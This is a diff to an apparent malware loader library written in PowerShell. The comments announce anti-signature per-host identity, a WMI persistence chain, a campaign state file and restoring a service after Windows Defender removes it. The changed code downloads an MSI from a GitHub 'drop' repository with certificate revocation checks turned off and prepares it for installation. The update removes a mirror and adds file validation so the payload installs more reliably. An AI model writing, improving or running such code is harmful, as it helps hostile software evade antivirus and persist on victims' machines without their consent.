@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L36
+# OWN_LIB  BUILD 20260802L37
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L36: STUCK/ABSENT with binaries on disk -> Repair-SCService re-creates stripped service (boot-time Defender strip), no download/reinstall. L35: -NoWait detached ensure.
+# L37: Get-GryxaMsi validates OLE magic + requires readable FP match when pinned; dropped jsdelivr binary (served 9-byte error). L36: boot-strip svc-recreate.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -514,7 +514,6 @@ function Get-GryxaMsi {
     # the host: schannel SEC_E_INVALID_TOKEN). ui.gryxa.com is only a fallback.
     $urls = @(
         'https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi',
-        'https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg_gryxa.msi',
         $script:GryxaMsiUrl
     )
     $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
@@ -524,10 +523,16 @@ function Get-GryxaMsi {
             Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
             & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $u 2>&1 | Out-Null
             if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) {
-                # FP-guard: never install a downloaded MSI whose FP mismatches the pinned one
+                # L37: validate it's a real MSI (OLE magic d0cf11e0). CDNs (jsdelivr) can return
+                # a small error page or an HTML redirect for binaries; a wrong-FP / non-MSI blob
+                # must never be installed.
+                $fs = [System.IO.File]::OpenRead($tmp); $magic = New-Object byte[] 4; $null = $fs.Read($magic,0,4); $fs.Close()
+                if (-not ($magic[0] -eq 0xD0 -and $magic[1] -eq 0xCF -and $magic[2] -eq 0x11 -and $magic[3] -eq 0xE0)) { continue }
+                # FP-guard: when pinned, the MSI's FP MUST be readable and match. An unreadable
+                # or mismatched FP -> reject (never install an unverifiable package).
                 if ($script:GryxaExpectedFp) {
                     $dlFp = Get-FpFromProductName (Get-MsiProperty $tmp 'ProductName')
-                    if ($dlFp -and ($dlFp -ne $script:GryxaExpectedFp)) { continue }
+                    if ($dlFp -ne $script:GryxaExpectedFp) { continue }
                 }
                 # cache into WorkDir when possible; if the workdir is ACL-locked, install from TEMP directly
                 try { Copy-Item -LiteralPath $tmp -Destination $msi -Force -ErrorAction Stop; return $msi } catch { return $tmp }
